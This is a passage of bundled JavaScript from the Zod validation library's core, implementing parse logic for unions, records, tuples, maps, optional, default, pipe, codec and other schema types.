    doc.write(`payload.value = newResult;`);
    doc.write(`return payload;`);
    const fn = doc.compile();
    return (payload, ctx) => fn(shape, payload, ctx);
  };
  let fastpass;
  const isObject2 = isObject;
  const jit = !globalConfig.jitless;
  const allowsEval2 = allowsEval;
  const fastEnabled = jit && allowsEval2.value;
  const catchall = def.catchall;
  let value;
  inst._zod.parse = (payload, ctx) => {
    value ?? (value = _normalized.value);
    const input = payload.value;
    if (!isObject2(input)) {
      payload.issues.push({
        expected: "object",
        code: "invalid_type",
        input,
        inst
      });
      return payload;
    }
    if (jit && fastEnabled && ctx?.async === false && ctx.jitless !== true) {
      if (!fastpass)
        fastpass = generateFastpass(def.shape);
      payload = fastpass(payload, ctx);
      if (!catchall)
        return payload;
      return handleCatchall([], input, payload, ctx, value, inst);
    }
    return superParse(payload, ctx);
  };
});
function handleUnionResults(results, final, inst, ctx) {
  for (const result of results) {
    if (result.issues.length === 0) {
      final.value = result.value;
      return final;
    }
  }
  const nonaborted = results.filter((r) => !aborted(r));
  if (nonaborted.length === 1) {
    final.value = nonaborted[0].value;
    return nonaborted[0];
  }
  final.issues.push({
    code: "invalid_union",
    input: final.value,
    inst,
    errors: results.map((result) => result.issues.map((iss) => finalizeIssue(iss, ctx, config())))
  });
  return final;
}
var $ZodUnion = /* @__PURE__ */ $constructor("$ZodUnion", (inst, def) => {
  $ZodType.init(inst, def);
  defineLazy(inst._zod, "optin", () => def.options.some((o) => o._zod.optin === "optional") ? "optional" : undefined);
  defineLazy(inst._zod, "optout", () => def.options.some((o) => o._zod.optout === "optional") ? "optional" : undefined);
  defineLazy(inst._zod, "values", () => {
    if (def.options.every((o) => o._zod.values)) {
      return new Set(def.options.flatMap((option) => Array.from(option._zod.values)));
    }
    return;
  });
  defineLazy(inst._zod, "pattern", () => {
    if (def.options.every((o) => o._zod.pattern)) {
      const patterns = def.options.map((o) => o._zod.pattern);
      return new RegExp(`^(${patterns.map((p) => cleanRegex(p.source)).join("|")})$`);
    }
    return;
  });
  const single = def.options.length === 1;
  const first = def.options[0]._zod.run;
  inst._zod.parse = (payload, ctx) => {
    if (single) {
      return first(payload, ctx);
    }
    let async = false;
    const results = [];
    for (const option of def.options) {
      const result = option._zod.run({
        value: payload.value,
        issues: []
      }, ctx);
      if (result instanceof Promise) {
        results.push(result);
        async = true;
      } else {
        if (result.issues.length === 0)
          return result;
        results.push(result);
      }
    }
    if (!async)
      return handleUnionResults(results, payload, inst, ctx);
    return Promise.all(results).then((results2) => {
      return handleUnionResults(results2, payload, inst, ctx);
    });
  };
});
function handleExclusiveUnionResults(results, final, inst, ctx) {
  const successes = results.filter((r) => r.issues.length === 0);
  if (successes.length === 1) {
    final.value = successes[0].value;
    return final;
  }
  if (successes.length === 0) {
    final.issues.push({
      code: "invalid_union",
      input: final.value,
      inst,
      errors: results.map((result) => result.issues.map((iss) => finalizeIssue(iss, ctx, config())))
    });
  } else {
    final.issues.push({
      code: "invalid_union",
      input: final.value,
      inst,
      errors: [],
      inclusive: false
    });
  }
  return final;
}
var $ZodXor = /* @__PURE__ */ $constructor("$ZodXor", (inst, def) => {
  $ZodUnion.init(inst, def);
  def.inclusive = false;
  const single = def.options.length === 1;
  const first = def.options[0]._zod.run;
  inst._zod.parse = (payload, ctx) => {
    if (single) {
      return first(payload, ctx);
    }
    let async = false;
    const results = [];
    for (const option of def.options) {
      const result = option._zod.run({
        value: payload.value,
        issues: []
      }, ctx);
      if (result instanceof Promise) {
        results.push(result);
        async = true;
      } else {
        results.push(result);
      }
    }
    if (!async)
      return handleExclusiveUnionResults(results, payload, inst, ctx);
    return Promise.all(results).then((results2) => {
      return handleExclusiveUnionResults(results2, payload, inst, ctx);
    });
  };
});
var $ZodDiscriminatedUnion = /* @__PURE__ */ $constructor("$ZodDiscriminatedUnion", (inst, def) => {
  def.inclusive = false;
  $ZodUnion.init(inst, def);
  const _super = inst._zod.parse;
  defineLazy(inst._zod, "propValues", () => {
    const propValues = {};
    for (const option of def.options) {
      const pv = option._zod.propValues;
      if (!pv || Object.keys(pv).length === 0)
        throw new Error(`Invalid discriminated union option at index "${def.options.indexOf(option)}"`);
      for (const [k, v] of Object.entries(pv)) {
        if (!propValues[k])
          propValues[k] = new Set;
        for (const val of v) {
          propValues[k].add(val);
        }
      }
    }
    return propValues;
  });
  const disc = cached(() => {
    const opts = def.options;
    const map = new Map;
    for (const o of opts) {
      const values = o._zod.propValues?.[def.discriminator];
      if (!values || values.size === 0)
        throw new Error(`Invalid discriminated union option at index "${def.options.indexOf(o)}"`);
      for (const v of values) {
        if (map.has(v)) {
          throw new Error(`Duplicate discriminator value "${String(v)}"`);
        }
        map.set(v, o);
      }
    }
    return map;
  });
  inst._zod.parse = (payload, ctx) => {
    const input = payload.value;
    if (!isObject(input)) {
      payload.issues.push({
        code: "invalid_type",
        expected: "object",
        input,
        inst
      });
      return payload;
    }
    const opt = disc.value.get(input?.[def.discriminator]);
    if (opt) {
      return opt._zod.run(payload, ctx);
    }
    if (def.unionFallback) {
      return _super(payload, ctx);
    }
    payload.issues.push({
      code: "invalid_union",
      errors: [],
      note: "No matching discriminator",
      discriminator: def.discriminator,
      input,
      path: [def.discriminator],
      inst
    });
    return payload;
  };
});
var $ZodIntersection = /* @__PURE__ */ $constructor("$ZodIntersection", (inst, def) => {
  $ZodType.init(inst, def);
  inst._zod.parse = (payload, ctx) => {
    const input = payload.value;
    const left = def.left._zod.run({ value: input, issues: [] }, ctx);
    const right = def.right._zod.run({ value: input, issues: [] }, ctx);
    const async = left instanceof Promise || right instanceof Promise;
    if (async) {
      return Promise.all([left, right]).then(([left2, right2]) => {
        return handleIntersectionResults(payload, left2, right2);
      });
    }
    return handleIntersectionResults(payload, left, right);
  };
});
function mergeValues(a, b) {
  if (a === b) {
    return { valid: true, data: a };
  }
  if (a instanceof Date && b instanceof Date && +a === +b) {
    return { valid: true, data: a };
  }
  if (isPlainObject(a) && isPlainObject(b)) {
    const bKeys = Object.keys(b);
    const sharedKeys = Object.keys(a).filter((key) => bKeys.indexOf(key) !== -1);
    const newObj = { ...a, ...b };
    for (const key of sharedKeys) {
      const sharedValue = mergeValues(a[key], b[key]);
      if (!sharedValue.valid) {
        return {
          valid: false,
          mergeErrorPath: [key, ...sharedValue.mergeErrorPath]
        };
      }
      newObj[key] = sharedValue.data;
    }
    return { valid: true, data: newObj };
  }
  if (Array.isArray(a) && Array.isArray(b)) {
    if (a.length !== b.length) {
      return { valid: false, mergeErrorPath: [] };
    }
    const newArray = [];
    for (let index = 0;index < a.length; index++) {
      const itemA = a[index];
      const itemB = b[index];
      const sharedValue = mergeValues(itemA, itemB);
      if (!sharedValue.valid) {
        return {
          valid: false,
          mergeErrorPath: [index, ...sharedValue.mergeErrorPath]
        };
      }
      newArray.push(sharedValue.data);
    }
    return { valid: true, data: newArray };
  }
  return { valid: false, mergeErrorPath: [] };
}
function handleIntersectionResults(result, left, right) {
  const unrecKeys = new Map;
  let unrecIssue;
  for (const iss of left.issues) {
    if (iss.code === "unrecognized_keys") {
      unrecIssue ?? (unrecIssue = iss);
      for (const k of iss.keys) {
        if (!unrecKeys.has(k))
          unrecKeys.set(k, {});
        unrecKeys.get(k).l = true;
      }
    } else {
      result.issues.push(iss);
    }
  }
  for (const iss of right.issues) {
    if (iss.code === "unrecognized_keys") {
      for (const k of iss.keys) {
        if (!unrecKeys.has(k))
          unrecKeys.set(k, {});
        unrecKeys.get(k).r = true;
      }
    } else {
      result.issues.push(iss);
    }
  }
  const bothKeys = [...unrecKeys].filter(([, f]) => f.l && f.r).map(([k]) => k);
  if (bothKeys.length && unrecIssue) {
    result.issues.push({ ...unrecIssue, keys: bothKeys });
  }
  if (aborted(result))
    return result;
  const merged = mergeValues(left.value, right.value);
  if (!merged.valid) {
    throw new Error(`Unmergable intersection. Error path: ` + `${JSON.stringify(merged.mergeErrorPath)}`);
  }
  result.value = merged.data;
  return result;
}
var $ZodTuple = /* @__PURE__ */ $constructor("$ZodTuple", (inst, def) => {
  $ZodType.init(inst, def);
  const items = def.items;
  inst._zod.parse = (payload, ctx) => {
    const input = payload.value;
    if (!Array.isArray(input)) {
      payload.issues.push({
        input,
        inst,
        expected: "tuple",
        code: "invalid_type"
      });
      return payload;
    }
    payload.value = [];
    const proms = [];
    const reversedIndex = [...items].reverse().findIndex((item) => item._zod.optin !== "optional");
    const optStart = reversedIndex === -1 ? 0 : items.length - reversedIndex;
    if (!def.rest) {
      const tooBig = input.length > items.length;
      const tooSmall = input.length < optStart - 1;
      if (tooBig || tooSmall) {
        payload.issues.push({
          ...tooBig ? { code: "too_big", maximum: items.length, inclusive: true } : { code: "too_small", minimum: items.length },
          input,
          inst,
          origin: "array"
        });
        return payload;
      }
    }
    let i = -1;
    for (const item of items) {
      i++;
      if (i >= input.length) {
        if (i >= optStart)
          continue;
      }
      const result = item._zod.run({
        value: input[i],
        issues: []
      }, ctx);
      if (result instanceof Promise) {
        proms.push(result.then((result2) => handleTupleResult(result2, payload, i)));
      } else {
        handleTupleResult(result, payload, i);
      }
    }
    if (def.rest) {
      const rest = input.slice(items.length);
      for (const el of rest) {
        i++;
        const result = def.rest._zod.run({
          value: el,
          issues: []
        }, ctx);
        if (result instanceof Promise) {
          proms.push(result.then((result2) => handleTupleResult(result2, payload, i)));
        } else {
          handleTupleResult(result, payload, i);
        }
      }
    }
    if (proms.length)
      return Promise.all(proms).then(() => payload);
    return payload;
  };
});
function handleTupleResult(result, final, index) {
  if (result.issues.length) {
    final.issues.push(...prefixIssues(index, result.issues));
  }
  final.value[index] = result.value;
}
var $ZodRecord = /* @__PURE__ */ $constructor("$ZodRecord", (inst, def) => {
  $ZodType.init(inst, def);
  inst._zod.parse = (payload, ctx) => {
    const input = payload.value;
    if (!isPlainObject(input)) {
      payload.issues.push({
        expected: "record",
        code: "invalid_type",
        input,
        inst
      });
      return payload;
    }
    const proms = [];
    const values = def.keyType._zod.values;
    if (values) {
      payload.value = {};
      const recordKeys = new Set;
      for (const key of values) {
        if (typeof key === "string" || typeof key === "number" || typeof key === "symbol") {
          recordKeys.add(typeof key === "number" ? key.toString() : key);
          const result = def.valueType._zod.run({ value: input[key], issues: [] }, ctx);
          if (result instanceof Promise) {
            proms.push(result.then((result2) => {
              if (result2.issues.length) {
                payload.issues.push(...prefixIssues(key, result2.issues));
              }
              payload.value[key] = result2.value;
            }));
          } else {
            if (result.issues.length) {
              payload.issues.push(...prefixIssues(key, result.issues));
            }
            payload.value[key] = result.value;
          }
        }
      }
      let unrecognized;
      for (const key in input) {
        if (!recordKeys.has(key)) {
          unrecognized = unrecognized ?? [];
          unrecognized.push(key);
        }
      }
      if (unrecognized && unrecognized.length > 0) {
        payload.issues.push({
          code: "unrecognized_keys",
          input,
          inst,
          keys: unrecognized
        });
      }
    } else {
      payload.value = {};
      for (const key of Reflect.ownKeys(input)) {
        if (key === "__proto__")
          continue;
        let keyResult = def.keyType._zod.run({ value: key, issues: [] }, ctx);
        if (keyResult instanceof Promise) {
          throw new Error("Async schemas not supported in object keys currently");
        }
        const checkNumericKey = typeof key === "string" && number.test(key) && keyResult.issues.length;
        if (checkNumericKey) {
          const retryResult = def.keyType._zod.run({ value: Number(key), issues: [] }, ctx);
          if (retryResult instanceof Promise) {
            throw new Error("Async schemas not supported in object keys currently");
          }
          if (retryResult.issues.length === 0) {
            keyResult = retryResult;
          }
        }
        if (keyResult.issues.length) {
          if (def.mode === "loose") {
            payload.value[key] = input[key];
          } else {
            payload.issues.push({
              code: "invalid_key",
              origin: "record",
              issues: keyResult.issues.map((iss) => finalizeIssue(iss, ctx, config())),
              input: key,
              path: [key],
              inst
            });
          }
          continue;
        }
        const result = def.valueType._zod.run({ value: input[key], issues: [] }, ctx);
        if (result instanceof Promise) {
          proms.push(result.then((result2) => {
            if (result2.issues.length) {
              payload.issues.push(...prefixIssues(key, result2.issues));
            }
            payload.value[keyResult.value] = result2.value;
          }));
        } else {
          if (result.issues.length) {
            payload.issues.push(...prefixIssues(key, result.issues));
          }
          payload.value[keyResult.value] = result.value;
        }
      }
    }
    if (proms.length) {
      return Promise.all(proms).then(() => payload);
    }
    return payload;
  };
});
var $ZodMap = /* @__PURE__ */ $constructor("$ZodMap", (inst, def) => {
  $ZodType.init(inst, def);
  inst._zod.parse = (payload, ctx) => {
    const input = payload.value;
    if (!(input instanceof Map)) {
      payload.issues.push({
        expected: "map",
        code: "invalid_type",
        input,
        inst
      });
      return payload;
    }
    const proms = [];
    payload.value = new Map;
    for (const [key, value] of input) {
      const keyResult = def.keyType._zod.run({ value: key, issues: [] }, ctx);
      const valueResult = def.valueType._zod.run({ value, issues: [] }, ctx);
      if (keyResult instanceof Promise || valueResult instanceof Promise) {
        proms.push(Promise.all([keyResult, valueResult]).then(([keyResult2, valueResult2]) => {
          handleMapResult(keyResult2, valueResult2, payload, key, input, inst, ctx);
        }));
      } else {
        handleMapResult(keyResult, valueResult, payload, key, input, inst, ctx);
      }
    }
    if (proms.length)
      return Promise.all(proms).then(() => payload);
    return payload;
  };
});
function handleMapResult(keyResult, valueResult, final, key, input, inst, ctx) {
  if (keyResult.issues.length) {
    if (propertyKeyTypes.has(typeof key)) {
      final.issues.push(...prefixIssues(key, keyResult.issues));
    } else {
      final.issues.push({
        code: "invalid_key",
        origin: "map",
        input,
        inst,
        issues: keyResult.issues.map((iss) => finalizeIssue(iss, ctx, config()))
      });
    }
  }
  if (valueResult.issues.length) {
    if (propertyKeyTypes.has(typeof key)) {
      final.issues.push(...prefixIssues(key, valueResult.issues));
    } else {
      final.issues.push({
        origin: "map",
        code: "invalid_element",
        input,
        inst,
        key,
        issues: valueResult.issues.map((iss) => finalizeIssue(iss, ctx, config()))
      });
    }
  }
  final.value.set(keyResult.value, valueResult.value);
}
var $ZodSet = /* @__PURE__ */ $constructor("$ZodSet", (inst, def) => {
  $ZodType.init(inst, def);
  inst._zod.parse = (payload, ctx) => {
    const input = payload.value;
    if (!(input instanceof Set)) {
      payload.issues.push({
        input,
        inst,
        expected: "set",
        code: "invalid_type"
      });
      return payload;
    }
    const proms = [];
    payload.value = new Set;
    for (const item of input) {
      const result = def.valueType._zod.run({ value: item, issues: [] }, ctx);
      if (result instanceof Promise) {
        proms.push(result.then((result2) => handleSetResult(result2, payload)));
      } else
        handleSetResult(result, payload);
    }
    if (proms.length)
      return Promise.all(proms).then(() => payload);
    return payload;
  };
});
function handleSetResult(result, final) {
  if (result.issues.length) {
    final.issues.push(...result.issues);
  }
  final.value.add(result.value);
}
var $ZodEnum = /* @__PURE__ */ $constructor("$ZodEnum", (inst, def) => {
  $ZodType.init(inst, def);
  const values = getEnumValues(def.entries);
  const valuesSet = new Set(values);
  inst._zod.values = valuesSet;
  inst._zod.pattern = new RegExp(`^(${values.filter((k) => propertyKeyTypes.has(typeof k)).map((o) => typeof o === "string" ? escapeRegex(o) : o.toString()).join("|")})$`);
  inst._zod.parse = (payload, _ctx) => {
    const input = payload.value;
    if (valuesSet.has(input)) {
      return payload;
    }
    payload.issues.push({
      code: "invalid_value",
      values,
      input,
      inst
    });
    return payload;
  };
});
var $ZodLiteral = /* @__PURE__ */ $constructor("$ZodLiteral", (inst, def) => {
  $ZodType.init(inst, def);
  if (def.values.length === 0) {
    throw new Error("Cannot create literal schema with no valid values");
  }
  const values = new Set(def.values);
  inst._zod.values = values;
  inst._zod.pattern = new RegExp(`^(${def.values.map((o) => typeof o === "string" ? escapeRegex(o) : o ? escapeRegex(o.toString()) : String(o)).join("|")})$`);
  inst._zod.parse = (payload, _ctx) => {
    const input = payload.value;
    if (values.has(input)) {
      return payload;
    }
    payload.issues.push({
      code: "invalid_value",
      values: def.values,
      input,
      inst
    });
    return payload;
  };
});
var $ZodFile = /* @__PURE__ */ $constructor("$ZodFile", (inst, def) => {
  $ZodType.init(inst, def);
  inst._zod.parse = (payload, _ctx) => {
    const input = payload.value;
    if (input instanceof File)
      return payload;
    payload.issues.push({
      expected: "file",
      code: "invalid_type",
      input,
      inst
    });
    return payload;
  };
});
var $ZodTransform = /* @__PURE__ */ $constructor("$ZodTransform", (inst, def) => {
  $ZodType.init(inst, def);
  inst._zod.parse = (payload, ctx) => {
    if (ctx.direction === "backward") {
      throw new $ZodEncodeError(inst.constructor.name);
    }
    const _out = def.transform(payload.value, payload);
    if (ctx.async) {
      const output = _out instanceof Promise ? _out : Promise.resolve(_out);
      return output.then((output2) => {
        payload.value = output2;
        return payload;
      });
    }
    if (_out instanceof Promise) {
      throw new $ZodAsyncError;
    }
    payload.value = _out;
    return payload;
  };
});
function handleOptionalResult(result, input) {
  if (result.issues.length && input === undefined) {
    return { issues: [], value: undefined };
  }
  return result;
}
var $ZodOptional = /* @__PURE__ */ $constructor("$ZodOptional", (inst, def) => {
  $ZodType.init(inst, def);
  inst._zod.optin = "optional";
  inst._zod.optout = "optional";
  defineLazy(inst._zod, "values", () => {
    return def.innerType._zod.values ? new Set([...def.innerType._zod.values, undefined]) : undefined;
  });
  defineLazy(inst._zod, "pattern", () => {
    const pattern = def.innerType._zod.pattern;
    return pattern ? new RegExp(`^(${cleanRegex(pattern.source)})?$`) : undefined;
  });
  inst._zod.parse = (payload, ctx) => {
    if (def.innerType._zod.optin === "optional") {
      const result = def.innerType._zod.run(payload, ctx);
      if (result instanceof Promise)
        return result.then((r) => handleOptionalResult(r, payload.value));
      return handleOptionalResult(result, payload.value);
    }
    if (payload.value === undefined) {
      return payload;
    }
    return def.innerType._zod.run(payload, ctx);
  };
});
var $ZodExactOptional = /* @__PURE__ */ $constructor("$ZodExactOptional", (inst, def) => {
  $ZodOptional.init(inst, def);
  defineLazy(inst._zod, "values", () => def.innerType._zod.values);
  defineLazy(inst._zod, "pattern", () => def.innerType._zod.pattern);
  inst._zod.parse = (payload, ctx) => {
    return def.innerType._zod.run(payload, ctx);
  };
});
var $ZodNullable = /* @__PURE__ */ $constructor("$ZodNullable", (inst, def) => {
  $ZodType.init(inst, def);
  defineLazy(inst._zod, "optin", () => def.innerType._zod.optin);
  defineLazy(inst._zod, "optout", () => def.innerType._zod.optout);
  defineLazy(inst._zod, "pattern", () => {
    const pattern = def.innerType._zod.pattern;
    return pattern ? new RegExp(`^(${cleanRegex(pattern.source)}|null)$`) : undefined;
  });
  defineLazy(inst._zod, "values", () => {
    return def.innerType._zod.values ? new Set([...def.innerType._zod.values, null]) : undefined;
  });
  inst._zod.parse = (payload, ctx) => {
    if (payload.value === null)
      return payload;
    return def.innerType._zod.run(payload, ctx);
  };
});
var $ZodDefault = /* @__PURE__ */ $constructor("$ZodDefault", (inst, def) => {
  $ZodType.init(inst, def);
  inst._zod.optin = "optional";
  defineLazy(inst._zod, "values", () => def.innerType._zod.values);
  inst._zod.parse = (payload, ctx) => {
    if (ctx.direction === "backward") {
      return def.innerType._zod.run(payload, ctx);
    }
    if (payload.value === undefined) {
      payload.value = def.defaultValue;
      return payload;
    }
    const result = def.innerType._zod.run(payload, ctx);
    if (result instanceof Promise) {
      return result.then((result2) => handleDefaultResult(result2, def));
    }
    return handleDefaultResult(result, def);
  };
});
function handleDefaultResult(payload, def) {
  if (payload.value === undefined) {
    payload.value = def.defaultValue;
  }
  return payload;
}
var $ZodPrefault = /* @__PURE__ */ $constructor("$ZodPrefault", (inst, def) => {
  $ZodType.init(inst, def);
  inst._zod.optin = "optional";
  defineLazy(inst._zod, "values", () => def.innerType._zod.values);
  inst._zod.parse = (payload, ctx) => {
    if (ctx.direction === "backward") {
      return def.innerType._zod.run(payload, ctx);
    }
    if (payload.value === undefined) {
      payload.value = def.defaultValue;
    }
    return def.innerType._zod.run(payload, ctx);
  };
});
var $ZodNonOptional = /* @__PURE__ */ $constructor("$ZodNonOptional", (inst, def) => {
  $ZodType.init(inst, def);
  defineLazy(inst._zod, "values", () => {
    const v = def.innerType._zod.values;
    return v ? new Set([...v].filter((x) => x !== undefined)) : undefined;
  });
  inst._zod.parse = (payload, ctx) => {
    const result = def.innerType._zod.run(payload, ctx);
    if (result instanceof Promise) {
      return result.then((result2) => handleNonOptionalResult(result2, inst));
    }
    return handleNonOptionalResult(result, inst);
  };
});
function handleNonOptionalResult(payload, inst) {
  if (!payload.issues.length && payload.value === undefined) {
    payload.issues.push({
      code: "invalid_type",
      expected: "nonoptional",
      input: payload.value,
      inst
    });
  }
  return payload;
}
var $ZodSuccess = /* @__PURE__ */ $constructor("$ZodSuccess", (inst, def) => {
  $ZodType.init(inst, def);
  inst._zod.parse = (payload, ctx) => {
    if (ctx.direction === "backward") {
      throw new $ZodEncodeError("ZodSuccess");
    }
    const result = def.innerType._zod.run(payload, ctx);
    if (result instanceof Promise) {
      return result.then((result2) => {
        payload.value = result2.issues.length === 0;
        return payload;
      });
    }
    payload.value = result.issues.length === 0;
    return payload;
  };
});
var $ZodCatch = /* @__PURE__ */ $constructor("$ZodCatch", (inst, def) => {
  $ZodType.init(inst, def);
  defineLazy(inst._zod, "optin", () => def.innerType._zod.optin);
  defineLazy(inst._zod, "optout", () => def.innerType._zod.optout);
  defineLazy(inst._zod, "values", () => def.innerType._zod.values);
  inst._zod.parse = (payload, ctx) => {
    if (ctx.direction === "backward") {
      return def.innerType._zod.run(payload, ctx);
    }
    const result = def.innerType._zod.run(payload, ctx);
    if (result instanceof Promise) {
      return result.then((result2) => {
        payload.value = result2.value;
        if (result2.issues.length) {
          payload.value = def.catchValue({
            ...payload,
            error: {
              issues: result2.issues.map((iss) => finalizeIssue(iss, ctx, config()))
            },
            input: payload.value
          });
          payload.issues = [];
        }
        return payload;
      });
    }
    payload.value = result.value;
    if (result.issues.length) {
      payload.value = def.catchValue({
        ...payload,
        error: {
          issues: result.issues.map((iss) => finalizeIssue(iss, ctx, config()))
        },
        input: payload.value
      });
      payload.issues = [];
    }
    return payload;
  };
});
var $ZodNaN = /* @__PURE__ */ $constructor("$ZodNaN", (inst, def) => {
  $ZodType.init(inst, def);
  inst._zod.parse = (payload, _ctx) => {
    if (typeof payload.value !== "number" || !Number.isNaN(payload.value)) {
      payload.issues.push({
        input: payload.value,
        inst,
        expected: "nan",
        code: "invalid_type"
      });
      return payload;
    }
    return payload;
  };
});
var $ZodPipe = /* @__PURE__ */ $constructor("$ZodPipe", (inst, def) => {
  $ZodType.init(inst, def);
  defineLazy(inst._zod, "values", () => def.in._zod.values);
  defineLazy(inst._zod, "optin", () => def.in._zod.optin);
  defineLazy(inst._zod, "optout", () => def.out._zod.optout);
  defineLazy(inst._zod, "propValues", () => def.in._zod.propValues);
  inst._zod.parse = (payload, ctx) => {
    if (ctx.direction === "backward") {
      const right = def.out._zod.run(payload, ctx);
      if (right instanceof Promise) {
        return right.then((right2) => handlePipeResult(right2, def.in, ctx));
      }
      return handlePipeResult(right, def.in, ctx);
    }
    const left = def.in._zod.run(payload, ctx);
    if (left instanceof Promise) {
      return left.then((left2) => handlePipeResult(left2, def.out, ctx));
    }
    return handlePipeResult(left, def.out, ctx);
  };
});
function handlePipeResult(left, next, ctx) {
  if (left.issues.length) {
    left.aborted = true;
    return left;
  }
  return next._zod.run({ value: left.value, issues: left.issues }, ctx);
}
var $ZodCodec = /* @__PURE__ */ $constructor("$ZodCodec", (inst, def) => {
  $ZodType.init(inst, def);
  defineLazy(inst._zod, "values", () => def.in._zod.values);
  defineLazy(inst._zod, "optin", () => def.in._zod.optin);
  defineLazy(inst._zod, "optout", () => def.out._zod.optout);
  defineLazy(inst._zod, "propValues", () => def.in._zod.propValues);
  inst._zod.parse = (payload, ctx) => {
    const direction = ctx.direction || "forward";
    if (direction === "forward") {
      const left = def.in._zod.run(payload, ctx);
      if (left instanceof Promise) {
        return left.then((left2) => handleCodecAResult(left2, def, ctx));
      }
      return handleCodecAResult(left, def, ctx);
    } else {
      const right = def.out._zod.run(payload, ctx);
      if (right instanceof Promise) {
        return right.then((right2) => handleCodecAResult(right2, def, ctx));
      }
      return handleCodecAResult(right, def, ctx);
    }
  };
});
function handleCodecAResult(result, def, ctx) {
  if (result.issues.length) {
    result.aborted = true;
    return result;
  }
  const direction = ctx.direction || "forward";
  if (direction === "forward") {
    const transformed = def.transform(result.value, result);
    if (transformed instanceof Promise) {
      return transformed.then((value) => handleCodecTxResult(result, value, def.out, ctx));
    }
    return handleCodecTxResult(result, transformed, def.out, ctx);
  } else {
    const transformed = def.reverseTransform(result.value, result);
    if (transformed instanceof Promise) {
      return transformed.then((value) => handleCodecTxResult(result, value, def.in, ctx));
    }
    return handleCodecTxResult(result, transformed, def.in, ctx);
  }
}
function handleCodecTxResult(left, value, nextSchema, ctx) {
  if (left.issues.length) {
    left.aborted = true;
    return left;
  }
  return nextSchema._zod.run({ value, issues: left.issues }, ctx);
}
var $ZodReadonly = /* @__PURE__ */ $constructor("$ZodReadonly", (inst, def) => {
  $ZodType.init(inst, def);
  defineLazy(inst._zod, "propValues", () => def.innerType._zod.propValues);
  defineLazy(inst._zod, "values", () => def.innerType._zod.values);
  defineLazy(inst._zod, "optin", () => def.innerType?._zod?.optin);
  defineLazy(inst._zod, "optout", () => def.innerType?._zod?.optout);
  inst._zod.parse = (payload, ctx) => {
    if (ctx.direction === "backward") {
      return def.innerType._zod.run(payload, ctx);
    }
    const result = def.innerType._zod.run(payload, ctx);
    if (result instanceof Promise) {
      return result.then(handleReadonlyResult);
    }
    return handleReadonlyResult(result);
  };
});
function handleReadonlyResult(payload) {
  payload.value = Object.freeze(payload.value);
  return payload;
}
var $ZodTemplateLiteral = /* @__PURE__ */ $constructor("$ZodTemplateLiteral", (inst, def) => {
  $ZodType.init(inst, def);
  const regexParts = [];
  for (const part of def.parts) {
    if (typeof part === "object" && part !== null) {
      if (!part._zod.pattern) {
        throw new Error(`Invalid template literal part, no pattern found: ${[...part._zod.traits].shift()}`);
      }
      const source = part._zod.pattern instanceof RegExp ? part._zod.pattern.source : part._zod.pattern;
      if (!source)
        throw new Error(`Invalid template literal part: ${part._zod.traits}`);
      const start = source.startsWith("^") ? 1 : 0;
      const end = source.endsWith("$") ? source.length - 1 : source.length;
      regexParts.push(source.slice(start, end));
    } else if (part === null || primitiveTypes.has(typeof part)) {
      regexParts.push(escapeRegex(`${part}`));
    } else {
      throw new Error(`Invalid template literal part: ${part}`);
    }
  }
  inst._zod.pattern = new RegExp(`^${regexParts.join("")}$`);
  inst._zod.parse = (payload, _ctx) => {
    if (typeof payload.value !== "string") {
      payload.issues.push({
        input: payload.value,
        inst,
        expected: "string",
        code: "invalid_type"
      });
      return payload;
    }
    inst._zod.pattern.lastIndex = 0;
    if (!inst._zod.pattern.test(payload.value)) {
      payload.issues.push({
        input: payload.value,
        inst,
        code: "invalid_format",
        format: def.format ?? "template_literal",
        pattern: inst._zod.pattern.source
      });
      return payload;
    }
    return payload;
  };
});
var $ZodFunction = /* @__PURE__ */ $constructor("$ZodFunction", (inst, def) => {
  $ZodType.init(inst, def);
  inst._def = def;
  inst._zod.def = def;
  inst.implement = (func) => {
    if (typeof func !== "function") {
      throw new Error("implement() must be called with a function");
    }
    return function(...args) {
      const parsedArgs = inst._def.input ? parse(inst._def.input, args) : args;
      const result = Reflect.apply(func, this, parsedArgs);
      if (inst._def.output) {
        return parse(inst._def.output, result);
      }
      return result;
    };
  };
  inst.implementAsync = (func) => {
    if (typeof func !== "function") {
      throw new Error("implementAsync() must be called with a function");
    }
    return async function(...args) {
      const parsedArgs = inst._def.input ? await parseAsync(inst._def.input, args) : args;
      const result = await Reflect.apply(func, this, parsedArgs);
      if (inst._def.output) {
        return await parseAsync(inst._def.output, result);
      }
      return result;
    };
  };
  inst._zod.parse = (payload, _ctx) => {
    if (typeof payload.value !== "function") {
      payload.issues.push({
        code: "invalid_type",
        expected: "function",
        input: payload.value,
        inst
      });
      return payload;
    }
    const hasPromiseOutput = inst._def.output && inst._def.output._zod.def.type === "promise";
    if (hasPromiseOutput) {
      payload.value = inst.implementAsync(payload.value);
    } else {
      payload.value = inst.implement(payload.value);
    }
    return payload;
  };
  inst.input = (...args) => {
    const F = inst.constructor;
    if (Array.isArray(args[0])) {
      return new F({
        type: "function",
        input: new $ZodTuple({
          type: "tuple",
          items: args[0],
          rest: args[1]
        }),
        output: inst._def.output
      });
    }
    return new F({
      type: "function",
      input: args[0],
      output: inst._def.output
    });
  };
  inst.output = (output) => {
    const F = inst.constructor;
    return new F({
      type: "function",
      input: inst._def.input,
      output
    });
  };
  return inst;
});
var $ZodPromise = /* @__PURE__ */ $constructor("$ZodPromise", (inst, def) => {
  $ZodType.init(inst, def);
  inst._zod.parse = (payload, ctx) => {
    return Promise.resolve(payload.value).then((inner) => def.innerType._zod.run({ value: inner, issues: [] }, ctx));
  };
});
var $ZodLazy = /* @__PURE__ */ $constructor("$ZodLazy", (inst, def) => {
  $ZodType.init(inst, def);
  defineLazy(inst._zod, "innerType", () => def.getter());
  defineLazy(inst._zod, "pattern", () => inst._zod.innerType?._zod?.pattern);
  defineLazy(inst._zod, "propValues", () => inst._zod.innerType?._zod?.propValues);
  defineLazy(inst._zod, "optin", () => inst._zod.innerType?._zod?.optin ?? undefined);
  defineLazy(inst._zod, "optout", () => inst._zod.innerType?._zod?.optout ?? undefined);
  inst._zod.parse = (payload, ctx) => {
    const inner = inst._zod.innerType;
    return inner._zod.run(payload, ctx);
  };
});
var $ZodCustom = /* @__PURE__ */ $constructor("$ZodCustom", (inst, def) => {
  $ZodCheck.init(inst, def);
  $ZodType.init(inst, def);
  inst._zod.parse = (payload, _) => {
    return payload;
  };
  inst._zod.check = (payload) => {
    const input = payload.value;
    const r = def.fn(input);
    if (r instanceof Promise) {
      return r.then((r2) => handleRefineResult(r2, payload, input, inst));
    }
    handleRefineResult(r, payload, input, inst);
    return;
  };
});
function handleRefineResult(result, payload, input, inst) {
  if (!result) {
    const _iss = {
      code: "custom",
      input,
